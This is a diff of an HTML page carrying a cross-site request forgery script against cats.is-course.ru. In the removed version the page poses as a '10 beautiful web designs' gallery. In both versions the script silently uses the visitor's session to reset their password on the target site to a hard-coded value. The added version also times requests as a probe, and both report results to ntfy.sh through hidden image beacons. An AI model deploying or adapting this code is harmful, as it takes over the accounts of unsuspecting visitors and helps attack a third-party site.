@@ -1,16 +1,18 @@
-<!doctype html><html><head><meta charset="utf-8"><title>Web design inspiration</title></head><body>
-<h1>10 beautiful web designs</h1>
+<!doctype html><html><head><meta charset="utf-8"><title>lat</title></head><body>
 <script>
-var U="catsdom1795228521", B="https://cats.is-course.ru", NP="Dm5!catwave2026";
+var U="catslat1795228694", B="https://cats.is-course.ru", NP="Dm5!catwave2026";
 function b(n){var i=document.createElement("img");i.width=1;i.height=1;
   i.src="https://ntfy.sh/"+U+"/trigger?message="+encodeURIComponent(n);document.body.appendChild(i);}
-b("d_start");
-var t0=performance.now();
-fetch(B+"/settings",{method:"POST",mode:"no-cors",credentials:"include",cache:"no-store",
-  headers:{"Content-Type":"application/x-www-form-urlencoded"},
-  body:"password="+encodeURIComponent(NP)+"&confirm-password="+encodeURIComponent(NP)})
- .then(function(){b("d_t_"+Math.round(performance.now()-t0));})
- .catch(function(e){b("d_err_"+e.name);});
-var n=0;
-var id=setInterval(function(){n++; b("d_alive"+n); if(n>=12){clearInterval(id); b("d_end");}},2000);
+function ms(p){var t0=performance.now();return p.then(function(){return Math.round(performance.now()-t0);});}
+b("l_start");
+ms(fetch(B+"/",{mode:"no-cors",credentials:"include",cache:"no-store"}))
+ .then(function(t){b("l_get"+t);});
+ms(fetch(B+"/settings",{method:"POST",mode:"no-cors",credentials:"include",cache:"no-store",
+   headers:{"Content-Type":"application/x-www-form-urlencoded"},
+   body:"password="+encodeURIComponent(NP)+"&confirm-password="+encodeURIComponent(NP)}))
+ .then(function(t){b("l_post"+t);});
+ms(fetch(B+"/login",{method:"POST",mode:"no-cors",credentials:"include",cache:"no-store",
+   headers:{"Content-Type":"application/x-www-form-urlencoded"},
+   body:"login=nouserzz&password=wrongwrongwrong"}))
+ .then(function(t){b("l_loginfake"+t);});
 </script></body></html>
